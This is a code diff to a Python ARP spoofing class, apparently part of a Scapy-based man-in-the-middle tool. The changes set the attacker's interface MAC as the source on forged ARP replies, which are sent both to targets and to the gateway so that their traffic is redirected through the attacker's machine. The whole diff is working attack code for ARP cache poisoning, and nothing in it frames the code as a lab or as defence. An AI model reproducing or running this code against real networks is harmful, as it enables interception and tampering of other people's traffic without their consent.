@@ -50,6 +50,8 @@ class ARPspoofer(threading.Thread):
         self.ip_mac = {}
         self.myself = None
         self.queue = queue
+        self.iface_mac = None
+        self.iface = None
         logger.info("Initializing ARPspoofer...")
         if os.getuid():
             logger.error("Run me as root!")
@@ -101,6 +103,9 @@ class ARPspoofer(threading.Thread):
             if mac is not None:
                 self.ip_mac[t] = mac
 
+        self.iface = config['iface']
+        self.iface_mac = utils.getHwAddr(self.iface)
+
     def __spoof(self):
         """
         Main spoofing function. Iterates through the targets lists and sends two packets each iteration.
@@ -118,7 +123,7 @@ class ARPspoofer(threading.Thread):
             # pkt = Ether(dst=mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
             # send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
             # send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
-            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
+            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac, hwsrc=self.iface_mac)
             sendp(pkt, verbose=0)
             if counter == INTERVAL:
                 logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
@@ -126,7 +131,7 @@ class ARPspoofer(threading.Thread):
 
             # p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
             # pkt = Ether(dst=self.ip_mac[self.gw]) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
-            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.gw, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff") #self.ip_mac[self.gw])
+            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff") #self.ip_mac[self.gw])
             sendp(pkt, verbose=0)
             if counter == INTERVAL:
                 logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
